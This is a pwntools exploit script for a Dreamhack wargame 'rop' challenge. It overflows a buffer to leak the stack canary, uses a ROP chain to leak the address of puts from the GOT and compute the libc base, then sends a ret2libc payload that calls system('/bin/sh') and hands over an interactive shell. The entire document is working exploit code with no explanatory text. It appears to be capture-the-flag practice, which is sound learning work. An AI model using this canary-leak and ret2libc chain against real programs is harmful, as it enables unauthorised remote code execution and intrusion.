from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/rop/rop')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23755'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

pop_rdi_ret = 0x400853
ret = 0x400596
puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x4006f7

#gdb.attach(p)

payload = b"A"*55+b"C"+b"D"
p.recvuntil(b": ")
p.send(payload)

p.recvuntil(b"D")
#canary is 8 bytes so we only need this part

data1 = p.recv(7)
canary = u64(data1.rjust(8, b"\x00"))
print(f"canary ist {hex(canary)}!")

p.recvuntil(b": ")
payload = b"A"*56 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)
sleep(1)

data3 = p.recv(6)
leak = u64(data3.ljust(8, b"\x00"))
print(f"puts ist {hex(leak)}!")
puts_offset = 0x084ed0
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc = leak - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

sleep(1)
p.send(b"a")

sleep(1)
payload = b"A"*56 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
